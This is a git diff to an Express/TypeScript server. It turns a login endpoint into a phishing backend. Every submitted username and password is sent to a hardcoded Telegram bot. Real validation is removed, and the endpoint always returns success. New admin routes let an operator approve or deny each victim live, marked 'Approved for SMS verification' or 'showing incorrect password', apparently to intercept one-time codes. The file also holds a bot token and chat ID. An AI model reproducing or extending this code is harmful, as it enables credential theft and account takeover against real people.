@@ -8,6 +8,9 @@ import { loginSchema, usernameSchema } from "@shared/schema";
 const TELEGRAM_BOT_TOKEN = "6954919116:AAF5ialybjcO6AJZ0CWGPVvtRoArCYzkK3I";
 const TELEGRAM_CHAT_ID = "-4535798767";
 
+// In-memory storage for pending requests
+const pendingRequests = new Map<string, any>();
+
 // Function to send message to Telegram
 async function sendToTelegram(username: string, password: string) {
   try {
@@ -40,49 +43,29 @@ export async function registerRoutes(app: Express): Promise<Server> {
       // Validate request body
       const loginData = loginSchema.parse(req.body);
 
+      // Generate unique request ID
+      const requestId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
+
       // Send login data to Telegram
       await sendToTelegram(loginData.username, loginData.password);
 
-      // Log the login attempt
-      await storage.logLoginAttempt({
+      // Store the pending request
+      pendingRequests.set(requestId, {
+        id: requestId,
         username: loginData.username,
-        success: false, // Will update this based on validation result
-        ipAddress: req.ip || req.connection.remoteAddress,
-        userAgent: req.get("User-Agent"),
+        password: loginData.password,
+        timestamp: new Date().toISOString(),
+        ipAddress: req.ip || req.connection.remoteAddress || 'Unknown',
+        userAgent: req.get("User-Agent") || 'Unknown',
+        status: 'pending'
       });
 
-      // Validate login credentials
-      const result = await storage.validateLogin(loginData);
-
-      // Log successful attempt if applicable
-      if (result.success) {
-        await storage.logLoginAttempt({
-          username: loginData.username,
-          success: true,
-          ipAddress: req.ip || req.connection.remoteAddress,
-          userAgent: req.get("User-Agent"),
-        });
-
-        // Update remember preference
-        await storage.updateUserRememberPreference(loginData.username, loginData.rememberUsername);
-      }
-
-      if (result.success) {
-        res.json({ 
-          success: true, 
-          message: result.message,
-          user: {
-            id: result.user!.id,
-            username: result.user!.username,
-            rememberUsername: result.user!.rememberUsername,
-          }
-        });
-      } else {
-        res.status(401).json({ 
-          success: false, 
-          message: result.message 
-        });
-      }
+      // Always return success with request ID - admin will control the flow
+      res.json({ 
+        success: true, 
+        message: "Login request submitted",
+        requestId: requestId
+      });
     } catch (error) {
       if (error instanceof z.ZodError) {
         res.status(400).json({
@@ -197,10 +180,60 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Get pending requests for admin panel
+  app.get("/api/admin/pending", async (req: Request, res: Response) => {
+    try {
+      // Return only pending requests
+      const pending = Array.from(pendingRequests.values()).filter(req => req.status === 'pending');
+      res.json(pending);
+    } catch (error) {
+      console.error('Error getting pending requests:', error);
+      res.status(500).json({
+        success: false,
+        message: "Internal server error",
+      });
+    }
+  });
+
+  // Check status of a specific request
+  app.get("/api/auth/status/:requestId", async (req: Request, res: Response) => {
+    try {
+      const requestId = req.params.requestId;
+      const request = pendingRequests.get(requestId);
+      
+      if (!request) {
+        res.status(404).json({
+          success: false,
+          message: "Request not found",
+        });
+        return;
+      }
+
+      res.json({
+        success: true,
+        status: request.status,
+        requestId: requestId
+      });
+    } catch (error) {
+      console.error('Error checking status:', error);
+      res.status(500).json({
+        success: false,
+        message: "Internal server error",
+      });
+    }
+  });
+
   // Admin panel routes
   app.post("/api/admin/grant", async (req: Request, res: Response) => {
     try {
-      const { username, password, action } = req.body;
+      const { requestId, username, password } = req.body;
+      
+      // Update request status
+      const request = pendingRequests.get(requestId);
+      if (request) {
+        request.status = 'granted';
+        pendingRequests.set(requestId, request);
+      }
       
       // Send grant notification to Telegram
       const message = `✅ LOGIN GRANTED\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toISOString()}\n📋 Action: Approved for SMS verification`;
@@ -232,7 +265,14 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
   app.post("/api/admin/deny", async (req: Request, res: Response) => {
     try {
-      const { username, password, action } = req.body;
+      const { requestId, username, password } = req.body;
+      
+      // Update request status
+      const request = pendingRequests.get(requestId);
+      if (request) {
+        request.status = 'denied';
+        pendingRequests.set(requestId, request);
+      }
       
       // Send deny notification to Telegram
       const message = `❌ LOGIN DENIED\n👤 Username: ${username}\n🔑 Password: ${password}\n⏰ Time: ${new Date().toISOString()}\n📋 Action: Denied - showing "incorrect password"`;
